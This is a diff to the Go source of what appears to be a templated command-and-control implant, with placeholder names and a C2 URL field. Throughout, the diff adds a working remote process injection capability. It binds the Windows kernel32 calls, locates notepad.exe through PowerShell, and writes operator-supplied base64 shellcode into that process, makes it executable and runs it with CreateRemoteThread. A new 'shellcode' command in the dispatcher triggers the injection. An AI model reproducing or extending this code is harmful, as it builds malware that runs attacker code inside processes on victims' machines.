@@ -16,10 +16,91 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"syscall"
 	"time"
+	"unsafe"
 
 	"github.com/fernet/fernet-go"
 )
+
+const (
+	PROCESS_CREATE_THREAD = 0x0002
+	PROCESS_QUERY_INFORMATION = 0x0400
+	PROCESS_VM_OPERATION = 0x0008
+	PROCESS_VM_WRITE = 0x0020
+	PROCESS_VM_READ = 0x0010
+	MEM_COMMIT = 0x1000
+	MEM_RESERVE = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
+	PAGE_READWRITE = 0x04
+
+	// For kernel32.dll functions
+	PROCESS_ALL_ACCESS = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
+)
+
+var (
+	kernel32 = syscall.NewLazyDLL("kernel32.dll")
+	procOpenProcess = kernel32.NewProc("OpenProcess")
+	procVirtualAllocEx = kernel32.NewProc("VirtualAllocEx")
+	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
+	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
+	procVirtualProtectEx = kernel32.NewProc("VirtualProtectEx")
+)
+
+func openProcess(desiredAccess uint32, inheritHandle int32, processId uint32) uintptr {
+	ret, _, _ := procOpenProcess.Call(
+		uintptr(desiredAccess),
+		uintptr(inheritHandle),
+		uintptr(processId),
+	)
+	return ret
+}
+
+func virtualAllocEx(process uintptr, address uintptr, size uintptr, allocationType uint32, protect uint32) uintptr {
+	ret, _, _ := procVirtualAllocEx.Call(
+		process,
+		address,
+		size,
+		uintptr(allocationType),
+		uintptr(protect),
+	)
+	return ret
+}
+
+func writeProcessMemory(process uintptr, baseAddress uintptr, buffer uintptr, size uintptr, numberOfBytesWritten *uintptr) bool {
+	ret, _, _ := procWriteProcessMemory.Call(
+		process,
+		baseAddress,
+		buffer,
+		size,
+		uintptr(unsafe.Pointer(numberOfBytesWritten)),
+	)
+	return ret != 0
+}
+
+func createRemoteThread(process uintptr, threadAttributes uintptr, stackSize uintptr, startAddress uintptr, parameter uintptr, creationFlags uint32, threadId *uint32) uintptr {
+	ret, _, _ := procCreateRemoteThread.Call(
+		process,
+		threadAttributes,
+		stackSize,
+		startAddress,
+		parameter,
+		uintptr(creationFlags),
+		uintptr(unsafe.Pointer(threadId)),
+	)
+	return ret
+}
+
+func virtualProtectEx(process uintptr, address uintptr, size uintptr, newProtect uint32, oldProtect *uint32) bool {
+	ret, _, _ := procVirtualProtectEx.Call(
+		process,
+		address,
+		size,
+		uintptr(newProtect),
+		uintptr(unsafe.Pointer(oldProtect)),
+	)
+	return ret != 0
+}
 
 type {AGENT_STRUCT_NAME} struct {
 	{AGENT_C2_URL_FIELD}                string
@@ -619,6 +700,79 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_BOF_FUNC}(command string) string {
 	return fmt.Sprintf("[SUCCESS] BOF executed with args: %s", bofArgs)
 }
 
+func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_PROCESS_ID_FUNC}(processName string) (uint32, error) {
+	// Find process ID for the specified process name (only on Windows)
+	if runtime.GOOS != "windows" {
+		return 0, fmt.Errorf("process injection only supported on Windows")
+	}
+
+	cmd := exec.Command("powershell", "-Command", fmt.Sprintf("Get-Process -Name %s -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id", processName))
+	output, err := cmd.Output()
+	if err != nil {
+		return 0, fmt.Errorf("failed to get process ID: %v", err)
+	}
+
+	processIDStr := strings.TrimSpace(string(output))
+	if processIDStr == "" {
+		return 0, fmt.Errorf("process %s not found", processName)
+	}
+
+	pid, err := strconv.ParseUint(processIDStr, 10, 32)
+	if err != nil {
+		return 0, fmt.Errorf("failed to parse process ID: %v", err)
+	}
+
+	return uint32(pid), nil
+}
+
+func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_SHELLCODE_FUNC}(shellcode []byte) string {
+
+	if runtime.GOOS != "windows" {
+		return "[ERROR] Process injection only supported on Windows"
+	}
+
+	// Get target process ID (notepad.exe)
+	pid, err := a.{AGENT_GET_PROCESS_ID_FUNC}("notepad")
+	if err != nil {
+		return fmt.Sprintf("[ERROR] Could not find notepad.exe: %v", err)
+	}
+
+	// Open the target process with all necessary permissions
+	processHandle := openProcess(PROCESS_ALL_ACCESS, 0, pid)
+	if processHandle == 0 {
+		return "[ERROR] Failed to open target process"
+	}
+
+	// Allocate memory in the target process
+	allocAddress := virtualAllocEx(processHandle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+	if allocAddress == 0 {
+		return "[ERROR] Failed to allocate memory in target process"
+	}
+
+	// Write shellcode to the allocated memory
+	var bytesWritten uintptr
+	success := writeProcessMemory(processHandle, allocAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
+	if !success {
+		return "[ERROR] Failed to write shellcode to target process memory"
+	}
+
+	// Change memory protection to executable
+	var oldProtect uint32
+	success = virtualProtectEx(processHandle, allocAddress, uintptr(len(shellcode)), PAGE_EXECUTE_READWRITE, &oldProtect)
+	if !success {
+		return "[ERROR] Failed to change memory protection in target process"
+	}
+
+	// Create remote thread to execute shellcode
+	var threadID uint32
+	threadHandle := createRemoteThread(processHandle, 0, 0, allocAddress, 0, 0, &threadID)
+	if threadHandle == 0 {
+		return "[ERROR] Failed to create remote thread in target process"
+	}
+
+	return fmt.Sprintf("[SUCCESS] Shellcode injected into notepad.exe (PID: %d), thread ID: %d", pid, threadID)
+}
+
 func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) string {
 
 	if strings.HasPrefix(command, "module ") {
@@ -639,6 +793,15 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) strin
 		return result
 	} else if strings.HasPrefix(command, "bof ") {
 		result := a.{AGENT_HANDLE_BOF_FUNC}(command)
+		return result
+	} else if strings.HasPrefix(command, "shellcode ") {
+		// Handle shellcode injection command
+		encodedShellcode := command[10:] // Remove "shellcode " prefix
+		shellcodeData, err := base64.StdEncoding.DecodeString(encodedShellcode)
+		if err != nil {
+			return fmt.Sprintf("[ERROR] Invalid shellcode data format: %v", err)
+		}
+		result := a.{AGENT_INJECT_SHELLCODE_FUNC}(shellcodeData)
 		return result
 	} else if command == "kill" {
 		a.{AGENT_RUNNING_FIELD} = false
